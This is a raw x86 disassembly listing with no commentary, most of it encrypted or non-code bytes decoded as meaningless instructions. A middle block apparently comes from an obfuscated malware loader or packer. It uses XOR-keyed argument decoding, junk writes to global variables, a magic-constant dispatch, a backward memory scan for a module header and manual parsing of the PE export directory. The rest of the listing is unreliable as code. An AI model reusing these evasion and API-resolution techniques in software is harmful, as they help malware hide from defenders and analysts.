  41e059:	imul   ebp,DWORD PTR [edx+ebx*8],0x20af64ea
  41e060:	mov    edx,0xb185f60f
  41e065:	mov    esp,0x325f99ee
  41e06a:	inc    edx
  41e06b:	int    0x4a
  41e06d:	cs inc ebp
  41e06f:	int3   
  41e070:	cmp    eax,0xb5797507
  41e075:	data16 (bad) 
  41e077:	cld    
  41e078:	mov    esp,0x52557ded
  41e07d:	cld    
  41e07e:	and    ecx,DWORD PTR [eax+edi*8-0x5e77ab09]
  41e085:	ficomp WORD PTR [esi]
  41e087:	adc    ah,dh
  41e089:	gs mov dl,ch
  41e08c:	xchg   ecx,eax
  41e08d:	xchg   DWORD PTR [edx+0x40],esi
  41e090:	fbld   TBYTE PTR [ecx]
  41e092:	push   edi
  41e093:	xchg   edi,eax
  41e094:	sbb    BYTE PTR [esp+esi*8],0x25
  41e098:	dec    ecx
  41e099:	xchg   esp,eax
  41e09a:	cmp    eax,0xd8aad7e8
  41e09f:	fsub   DWORD PTR ds:0xc444ca51
  41e0a5:	(bad)  
  41e0a6:	ds mov cl,0x15
  41e0a9:	pop    esi
  41e0aa:	mov    bl,0xe4
  41e0ac:	pushf  
  41e0ad:	cmp    al,0xa
  41e0af:	mov    eax,0xb44534dd
  41e0b4:	je     0x41e049
  41e0b6:	xchg   edi,eax
  41e0b7:	cmp    dl,bl
  41e0b9:	retf   0x913d
  41e0bc:	pop    ds
  41e0bd:	xchg   esp,eax
  41e0be:	jo     0x41e087
  41e0c0:	add    eax,0x428e3f
  41e0c5:	push   esp
  41e0c6:	adc    eax,DWORD PTR [eax]
  41e0c8:	add    BYTE PTR [edi],cl
  41e0ca:	test   DWORD PTR [ecx],esi
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    BYTE PTR [ebx],bh
  41e0d0:	xrelease mov DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 mov al,ds:0xcb063c95
  41e388:	fiadd  DWORD PTR [edx-0x7c9fd87d]
  41e38e:	or     DWORD PTR [ecx+0x2e],0xffffffa4
  41e392:	les    ebp,FWORD PTR [eax-0x5f2076c8]
  41e398:	outs   dx,BYTE PTR ds:[esi]
  41e399:	retf   0xc539
  41e39c:	and    ecx,DWORD PTR [edx+0x1dea87]
  41e3a2:	jmp    0x41e3c3
  41e3a4:	or     al,0xce
  41e3a6:	test   ecx,edx
  41e3a8:	arpl   WORD PTR [ebx-0x41c7bdf1],ax
  41e3ae:	pop    esp
  41e3af:	jle    0x41e391
  41e3b1:	scas   al,BYTE PTR es:[edi]
  41e3b2:	fiadd  DWORD PTR [eax+0x44]
  41e3b5:	imul   esi,DWORD PTR [esi-0x36def4e9],0xd
  41e3bc:	add    al,0x4
  41e3be:	mul    BYTE PTR [edi+eax*1-0x69c00f84]
  41e3c5:	loope  0x41e3b4
  41e3c7:	lock iret 
  41e3c9:	push   ss
  41e3ca:	add    esp,DWORD PTR [edx+0x3d]
  41e3cd:	mov    dh,0x58
  41e3cf:	inc    esp
  41e3d0:	lods   al,BYTE PTR ds:[esi]
  41e3d1:	js     0x41e3b8
  41e3d3:	je     0x41e3bf
  41e3d5:	dec    edi
  41e3d6:	aas    
  41e3d7:	loopne 0x41e3e6
  41e3d9:	xchg   ebp,eax
  41e3db:	sbb    dh,al
  41e3dd:	mov    esi,0xc1aab989
  41e3e2:	mov    edx,0xa5fe92a2
  41e3e7:	hlt    
  41e3e8:	cli    
  41e3e9:	fsubp  st(6),st
  41e3eb:	cld    
  41e3ec:	in     eax,0x3b
  41e3ee:	sti    
  41e3ef:	fild   WORD PTR [esi+edi*2]
  41e3f2:	cmp    al,0xb5
  41e3f4:	cs push es
  41e3f6:	add    BYTE PTR [edi+esi*2-0x2b],ah
  41e3fa:	popf   
  41e3fb:	fiadd  WORD PTR [eax-0x927b760]
  41e401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e402:	sub    DWORD PTR [edx+0x13],esi
  41e405:	xor    ah,BYTE PTR [esi+0x3c27f3a7]
  41e40b:	jmp    0xe6f6:0x7babb38a
  41e412:	push   ebx
  41e413:	and    ecx,0x60
  41e416:	mov    ds:0xa3f8f808,eax
  41e41b:	inc    esp
  41e41c:	lock je 0x41e486
  41e41f:	test   al,0x4b
  41e421:	sbb    esi,ebx
  41e423:	push   0x49
  41e425:	dec    esi
  41e426:	loopne 0x41e41c
  41e428:	xchg   edx,eax
  41e429:	fisub  WORD PTR [eax]
  41e42b:	and    eax,0x308b7f33
  41e430:	inc    ebx
  41e431:	jae    0x41e48d
  41e433:	jo     0x41e47d
  41e435:	ins    BYTE PTR es:[edi],dx
  41e436:	xchg   ebp,eax
  41e437:	leave  
  41e438:	cs in  al,0x6b
  41e43b:	lods   al,BYTE PTR ds:[esi]
  41e43c:	mov    BYTE PTR [esi+edx*4],al
  41e43f:	mov    dh,0x43
  41e441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e442:	jmp    0x1603:0x68c70e51
  41e449:	fcmovnb st,st(0)
  41e44b:	outs   dx,BYTE PTR ds:[esi]
  41e44c:	pop    ebp
  41e44d:	lds    edi,FWORD PTR [edi-0x78]
  41e450:	cld    
  41e451:	and    ah,ah
  41e453:	jmp    0x6cb708ab
  41e458:	jmp    0x476f:0x214ada4e
  41e45f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e460:	enter  0x27a4,0x14
  41e464:	mov    ds:0x7849bdcb,al
  41e469:	inc    ebx
  41e46a:	pop    ss
  41e46b:	push   ebp
  41e46c:	out    0x21,eax
  41e46e:	sbb    ch,BYTE PTR [eax-0x39]
  41e471:	and    DWORD PTR [ecx+0xf2a6fca],0xdcac4b0c
  41e47b:	mov    esp,0xd61126f5
  41e480:	fist   DWORD PTR [eax+edx*1-0x2bab845b]
  41e487:	loop   0x41e4f3
  41e489:	jb     0x41e467
  41e48b:	jno    0x41e4a1
  41e48d:	inc    edx
  41e48e:	xchg   DWORD PTR [edx],esi
  41e490:	xchg   BYTE PTR [bp-0x29],dh
  41e494:	and    ebp,DWORD PTR [ebx+edx*8+0x5a6d01e9]
  41e49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e49c:	dec    ecx
  41e49d:	and    al,0x4d
  41e49f:	imul   ebp,eax,0xc8d659c2
  41e4a5:	addr16 ss inc ebx
  41e4a9:	outs   dx,BYTE PTR ds:[esi]
  41e4aa:	inc    ebp
  41e4ab:	jbe    0x41e4a0
  41e4ad:	push   esi
  41e4ae:	jmp    0xdc3ea0a3
  41e4b3:	xor    BYTE PTR [edi],ch
  41e4b5:	ds push esp
  41e4b7:	mov    WORD PTR [esp+ecx*4-0x34df2469],cs
  41e4be:	inc    edx
  41e4bf:	aaa    
  41e4c0:	icebp  
  41e4c1:	cmp    dh,BYTE PTR [ebp-0x7e2ea5fc]
  41e4c7:	das    
  41e4c8:	jmp    0x41e4cb
  41e4ca:	dec    DWORD PTR ds:0x3d29d04c
  41e4d0:	push   esi
  41e4d1:	aaa    
  41e4d2:	test   al,0xc0
  41e4d4:	idiv   DWORD PTR [edx-0x6bdd4440]
  41e4da:	or     ebx,DWORD PTR [eax-0xa]
  41e4dd:	push   esp
  41e4de:	mov    bl,0x38
  41e4e0:	and    al,0x7b
  41e4e2:	mov    cl,0x97
  41e4e4:	addr16 push ss
  41e4e6:	loopne 0x41e47b
  41e4e8:	rcl    DWORD PTR [esi],0xdb
  41e4eb:	and    DWORD PTR [ebp-0x6d],esp
  41e4ee:	sub    DWORD PTR [eax],esp
  41e4f0:	(bad)  
  41e4f1:	jmp    0xd8b7:0xb7ba9fdc
  41e4f8:	push   0x96a3363d
  41e4fd:	stos   DWORD PTR es:[edi],eax
  41e4fe:	add    edx,esp
  41e500:	sub    dh,cl
  41e502:	aad    0x29
  41e504:	fwait
  41e505:	and    ecx,eax
  41e507:	push   ebx
  41e508:	cmp    eax,0xed71342
  41e50d:	pop    ds
  41e50e:	fisub  WORD PTR [edx-0x15]
  41e511:	adc    DWORD PTR [ebx-0x6981772c],0xc7893432
  41e51b:	mov    esi,0xedcc0375
  41e520:	push   0xffffffe6
  41e522:	test   al,0x51
  41e524:	jb     0x41e503
  41e526:	sub    al,0x4a
  41e528:	pop    es
  41e529:	out    0xca,eax
  41e52b:	sbb    al,dh
  41e52d:	pop    ss
  41e52e:	cmp    esp,DWORD PTR [ecx-0x40]
  41e531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e532:	(bad)  
  41e533:	mov    al,ds:0x2e1fcefc
  41e538:	pop    esi
  41e539:	int    0x4
  41e53b:	sbb    BYTE PTR [eax],bl
  41e53d:	int3   
  41e53e:	xor    ecx,DWORD PTR [edx-0x46]
  41e541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e542:	fsubr  QWORD PTR [edx]
  41e544:	adc    ebp,DWORD PTR [eax]
  41e546:	and    al,0xa8
  41e548:	ficom  WORD PTR ds:0xf26bed22
  41e54e:	sub    DWORD PTR [ebx],0xbcd7a2a0
  41e554:	fild   QWORD PTR [edx]
  41e556:	popa   
  41e557:	aam    0x5a
  41e559:	or     esi,ebp
  41e55b:	mov    esi,ds
  41e55d:	div    BYTE PTR [ebx+0x46c39d25]
  41e563:	es mov edx,0xffd860b4
  41e569:	and    BYTE PTR [edx-0x3f],al
  41e56c:	rcl    DWORD PTR [edi-0x49],0xc2
  41e570:	xor    DWORD PTR [edi],ecx
  41e572:	push   es
  41e573:	push   ss
  41e574:	and    DWORD PTR [esi+0x882268f],eax
  41e57a:	fadd   st,st(1)
  41e57c:	xor    eax,0xadbbed5a
  41e581:	jle    0x41e5f5
  41e583:	jle    0x41e5f2
  41e585:	mov    ds:0x301f4d00,al
  41e58a:	mov    ebx,0x66a3bca
  41e58f:	inc    edi
  41e590:	and    DWORD PTR [ecx-0x17],ebx
  41e593:	xchg   ebp,eax
  41e594:	cld    
  41e595:	adc    eax,0xaf0901a7
  41e59a:	push   ebp
  41e59b:	(bad)  
  41e59c:	imul   edx,DWORD PTR [eax+0x4c6c0fbe],0x21c35159
  41e5a6:	add    DWORD PTR [ecx-0x2],0xde1719e4
  41e5ad:	xor    al,0x41
  41e5af:	lahf   
  41e5b0:	mov    ah,0x7d
  41e5b2:	fld    st(3)
  41e5b4:	ja     0x41e5e5
  41e5b6:	xor    al,0x43
  41e5b8:	fisttp WORD PTR [edi-0x69beef08]
  41e5be:	call   0x56e3809
  41e5c3:	and    ebp,ebp
  41e5c5:	les    eax,FWORD PTR [edi+ecx*8]
  41e5c8:	fdivp  st(4),st
  41e5ca:	aam    0x65
  41e5cc:	gs idiv DWORD PTR gs:[eax+0x571dd478]
  41e5d4:	push   ebp
  41e5d5:	in     eax,0x48
  41e5d7:	dec    edi
  41e5d8:	push   0xa015f674
  41e5dd:	not    DWORD PTR [ecx+0x69]
  41e5e0:	push   ss
  41e5e1:	adc    edx,edi
  41e5e3:	pushf  
  41e5e4:	pusha  
  41e5e5:	hlt    
  41e5e6:	stos   DWORD PTR es:[edi],eax
  41e5e7:	sbb    eax,0x4ecc0490
  41e5ec:	or     DWORD PTR ds:0xb1f46015,ecx
  41e5f2:	int    0x58
  41e5f4:	lock and eax,0xc353fcc3
  41e5fa:	xchg   ecx,eax
  41e5fb:	lock push ds
  41e5fd:	loopne 0x41e606
  41e5ff:	lods   al,BYTE PTR ds:[esi]
  41e600:	or     dl,bl
  41e602:	adc    DWORD PTR [edi-0x3b],ecx
  41e605:	xchg   esp,eax
  41e606:	push   0x708c8344
  41e60b:	aas    
  41e60c:	pop    ebx
  41e60d:	rcr    DWORD PTR [edx-0x76f5b7d6],0x9d
  41e614:	mov    ds:0x71ea82d8,eax
  41e619:	xchg   DWORD PTR [ebx-0x5b9966ec],edi
  41e61f:	ds jns 0x41e5ad
  41e622:	sbb    eax,0x7e7078ac
  41e627:	xor    esp,DWORD PTR [ebx+eiz*2-0x13]
  41e62b:	fs sahf 
  41e62d:	repnz inc ebx
  41e62f:	mov    eax,ds:0xae844473
  41e634:	pop    esi
  41e635:	js     0x41e5bc
  41e637:	ret    
  41e638:	popa   
  41e639:	je     0x41e629
  41e63b:	mov    ebp,0x615e4c1f
  41e640:	xor    edi,DWORD PTR [edi+edx*2]
  41e643:	xor    al,0xbc
  41e645:	(bad)  
  41e646:	iret   
  41e647:	mul    dl
  41e649:	rcr    BYTE PTR [ecx-0x47],0xcd
  41e64d:	jecxz  0x41e647
  41e64f:	push   cs
  41e650:	fcomp  QWORD PTR [edi+0x4f]
  41e653:	test   al,0x6
  41e655:	push   ss
  41e656:	xchg   ebx,eax
  41e657:	int3   
  41e658:	xchg   edi,eax
  41e659:	cmp    edi,esp
  41e65b:	cmp    al,dl
  41e65d:	aad    0x78
  41e65f:	std    
  41e660:	pop    esp
  41e661:	retf   
  41e662:	icebp  
  41e663:	test   al,0xe8
  41e665:	mov    al,0xd5
  41e667:	test   ecx,edx
  41e669:	inc    esi
  41e66a:	sbb    dh,0x84
  41e66d:	mov    ecx,0xf4bf38f2
  41e672:	outs   dx,DWORD PTR ds:[esi]
  41e673:	nop
  41e674:	loope  0x41e617
  41e676:	pushf  
  41e677:	mov    dl,0x34
  41e679:	xor    al,0x12
  41e67b:	adc    BYTE PTR [ebx+0x78],dh
  41e67e:	icebp  
  41e67f:	pushf  
  41e680:	aas    
  41e681:	loope  0x41e622
  41e683:	and    al,0xb1
  41e685:	sbb    eax,0x70fbdb31
  41e68a:	pop    esp
  41e68b:	cmp    al,0x9e
  41e68d:	stos   DWORD PTR es:[edi],eax
  41e68e:	dec    ebx
  41e68f:	sub    DWORD PTR [edi-0x64],edi
  41e692:	(bad)  
  41e693:	fisub  DWORD PTR [ecx+0x1]
  41e696:	mov    bh,BYTE PTR [eax]
  41e698:	scas   al,BYTE PTR es:[edi]
  41e699:	inc    ebx
  41e69a:	jae    0x41e65d
  41e69c:	add    ah,al
  41e69e:	mov    al,0xcb
  41e6a0:	jo     0x41e69b
  41e6a2:	or     eax,0x549895ac
  41e6a7:	shr    BYTE PTR [ecx],1
  41e6a9:	sub    al,0xde
  41e6ab:	aam    0xeb
  41e6ad:	fs sbb eax,0x100b12cf
  41e6b3:	mov    al,0x7e
  41e6b5:	in     eax,dx
  41e6b6:	xchg   DWORD PTR [edx],ecx
  41e6b8:	je     0x41e6e2
  41e6ba:	mov    BYTE PTR [esi],bh
  41e6bc:	push   edx
  41e6bd:	xor    ebp,DWORD PTR [ecx]
  41e6bf:	pop    ecx
  41e6c0:	cmp    BYTE PTR [ebx],bh
  41e6c2:	out    0xb1,eax
  41e6c4:	pusha  
  41e6c5:	dec    ecx
  41e6c6:	or     bl,bh
  41e6c8:	fsubr  st(4),st
  41e6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6cb:	pop    es
  41e6cc:	pop    ds
  41e6cd:	rcr    esi,1
  41e6cf:	gs (bad) 
  41e6d1:	leave  
  41e6d2:	xlat   BYTE PTR ds:[ebx]
  41e6d3:	sbb    eax,0xaf95eac8
  41e6d8:	shl    BYTE PTR [edx+0x278916f],1
  41e6de:	mov    al,ds:0xd86b8439
  41e6e3:	std    
  41e6e4:	mov    dh,0xa3
  41e6e6:	fidiv  WORD PTR [eax-0x6d]
  41e6e9:	sbb    ecx,eax
  41e6eb:	cwde   
  41e6ec:	arpl   WORD PTR [eax],di
  41e6ee:	adc    al,0xec
  41e6f0:	aas    
  41e6f1:	push   0xfffffff4
  41e6f3:	inc    DWORD PTR [ecx-0x9]
  41e6f6:	cli    
  41e6f7:	(bad)  
  41e6f8:	in     al,0xf6
  41e6fa:	test   eax,0xdc1ffc28
  41e6ff:	data16 in al,0xdf
  41e702:	fld    QWORD PTR [edi+eiz*2+0x64172fcc]
  41e709:	popa   
  41e70a:	(bad)  
  41e70b:	xor    ebp,esi
  41e70d:	in     eax,0x29
  41e70f:	sub    BYTE PTR fs:[edi+0x4f],0xbf
  41e714:	xor    al,ah
  41e716:	dec    ebx
  41e717:	shl    BYTE PTR [edi+ebx*2+0x7792f4e],cl
  41e71e:	std    
  41e71f:	jmp    0x6a62:0x5d86cd76
  41e726:	jne    0x41e78d
  41e728:	cli    
  41e729:	jbe    0x41e6b1
  41e72b:	mov    bh,BYTE PTR [esi+0xed26382]
  41e731:	sub    dh,ch
  41e733:	nop
  41e734:	pop    DWORD PTR [edi]
  41e736:	mov    ah,0xb5
  41e738:	lds    ecx,FWORD PTR [ebx-0x533c0397]
  41e73e:	and    ecx,DWORD PTR [ecx+0x54aab192]
  41e744:	pop    esp
  41e745:	fcomp  QWORD PTR [esi+0x7173833e]
  41e74b:	dec    esi
  41e74c:	push   eax
  41e74d:	pop    ebp
  41e74e:	push   0xffffffb6
  41e750:	push   esi
  41e751:	jbe    0x41e6fa
  41e753:	mov    dh,0xb4
  41e755:	jo     0x41e722
  41e757:	cmp    DWORD PTR [ecx+0x76e76323],esi
  41e75d:	dec    edi
  41e75e:	mov    esi,0x60eb9056
  41e763:	pop    esi
  41e765:	push   es
  41e766:	js     0x41e752
  41e768:	xchg   BYTE PTR [ebx+eax*2+0x6510da8c],bh
  41e76f:	mov    cl,0x1a
  41e771:	sbb    ch,BYTE PTR [edi+edi*8+0xc599196]
  41e778:	scas   al,BYTE PTR es:[edi]
  41e779:	xor    DWORD PTR [edx-0x6aa9ece3],0x8
  41e780:	rcr    DWORD PTR [eax],0xd3
  41e783:	push   es
  41e784:	mov    WORD PTR [edx+edi*2+0x36],ds
  41e788:	daa    
  41e789:	(bad)  
  41e78a:	imul   ebx,DWORD PTR es:[edi],0x2
  41e78e:	xor    ebx,DWORD PTR [edx+0x4c]
  41e791:	push   ebx
  41e792:	mov    ch,0x77
  41e794:	aam    0x1f
  41e796:	push   0x65a15a1b
  41e79b:	in     al,dx
  41e79c:	mov    eax,0xc7678a35
  41e7a1:	fldcw  WORD PTR [edi-0x63587dc8]
  41e7a7:	mov    ds:0xdc2f7935,al
  41e7ac:	mov    ah,ah
  41e7ae:	shr    BYTE PTR [edi+0x2c],1
  41e7b1:	and    eax,0xd4267be1
  41e7b6:	loopne 0x41e7ba
  41e7b8:	sub    cl,bl
  41e7ba:	dec    edi
  41e7bb:	int3   
  41e7bc:	inc    eax
  41e7bd:	mov    DWORD PTR [esi],0xc119b159
  41e7c3:	loopne 0x41e789
  41e7c5:	inc    edi
  41e7c6:	mov    ah,0x28
  41e7c8:	add    BYTE PTR [ebx],bl
  41e7ca:	pop    ecx
  41e7cb:	rcl    DWORD PTR [edi+0x2b0d4128],1
  41e7d1:	cwde   
  41e7d2:	outs   dx,BYTE PTR ds:[esi]
  41e7d3:	aas    
  41e7d4:	and    eax,0xc989d2c0
  41e7d9:	sub    BYTE PTR [ecx],0x80
  41e7dc:	jns    0x41e7b8
  41e7de:	add    BYTE PTR [eax+eax*1],0xc1
  41e7e2:	xchg   edi,eax
  41e7e3:	push   eax
  41e7e4:	ins    DWORD PTR es:[edi],dx
  41e7e5:	dec    ecx
  41e7e6:	mov    al,ds:0xec226964
  41e7eb:	or     bl,BYTE PTR [ebp+0x30fa9579]
  41e7f1:	int3   
  41e7f2:	xor    eax,0xb3597293
  41e7f7:	test   BYTE PTR [edi+0x32618993],al
  41e7fd:	cmp    DWORD PTR [ebp+ecx*4+0x495f97e],ecx
  41e804:	jg     0x41e7bd
  41e806:	out    0x8a,al
  41e808:	xor    DWORD PTR ds:0x919d436e,edi
  41e80e:	add    edx,DWORD PTR [eax-0x44]
  41e811:	addr16 mov eax,fs
  41e814:	add    eax,0xe1d29cc5
  41e819:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e81b:	dec    edi
  41e81c:	push   esi
  41e81d:	sbb    al,0xa5
  41e81f:	test   eax,0x2f0a5af3
  41e824:	jno    0x41e7fa
  41e826:	or     dh,ah
  41e828:	retf   
  41e829:	cmp    eax,DWORD PTR [edi]
  41e82b:	sub    edi,DWORD PTR [edx+0x26f00e65]
  41e831:	shr    DWORD PTR [ebx],cl
  41e833:	xchg   ebx,eax
  41e834:	push   0xffffffa7
  41e836:	pusha  
  41e837:	sbb    al,0x27
  41e839:	jne    0x41e8a9
  41e83b:	inc    eax
  41e83c:	push   ecx
  41e83d:	out    0xbf,al
  41e83f:	lods   eax,DWORD PTR ds:[esi]
  41e840:	addr16 xchg ebx,eax
  41e842:	xchg   ecx,eax
  41e843:	jo     0x41e85e
  41e845:	sub    DWORD PTR [edi+0x187df1d8],esp
  41e84b:	mov    bl,0xc
  41e84d:	dec    edi
  41e84e:	enter  0x1abd,0x49
  41e852:	fneni(8087 only) 
  41e854:	(bad)  
  41e855:	out    0x8e,eax
  41e857:	xor    esp,DWORD PTR [eax+esi*8+0x50]
  41e85b:	mov    esi,0xa01b3d6e
  41e860:	and    DWORD PTR [esi+0x3fbe0f92],ebp
  41e866:	push   ebx
  41e867:	jl     0x41e8b3
  41e869:	mov    eax,0x92d15211
  41e86e:	or     eax,0x66f760a6
  41e873:	cmp    eax,0x23280575
  41e878:	(bad)  
  41e879:	in     eax,dx
  41e87a:	ja     0x41e802
  41e87c:	mov    dh,0xc1
  41e87e:	sbb    esi,edx
  41e880:	mov    dl,dh
  41e882:	mov    DWORD PTR [ebx-0x29944c41],ebp
  41e888:	loope  0x41e8f6
  41e88a:	sti    
  41e88b:	mov    ebp,0x8ed4f1a8
  41e890:	rcr    DWORD PTR [esi+0x48],0x25
  41e894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e895:	out    0x7f,al
  41e897:	mov    bh,0x39
  41e899:	cs into 
  41e89b:	or     BYTE PTR [esi+eiz*8+0x49],bh
  41e89f:	push   eax
  41e8a0:	jl     0x41e86d
  41e8a2:	rcl    ah,0xce
  41e8a5:	mov    dh,dl
  41e8a7:	push   0x847a914c
  41e8ac:	or     DWORD PTR [eax+ebx*8-0x619eb5ab],esi
  41e8b3:	pop    edx
  41e8b4:	or     al,ah
  41e8b6:	lods   al,BYTE PTR ds:[esi]
  41e8b7:	daa    
  41e8b8:	nop
  41e8b9:	xchg   edi,eax
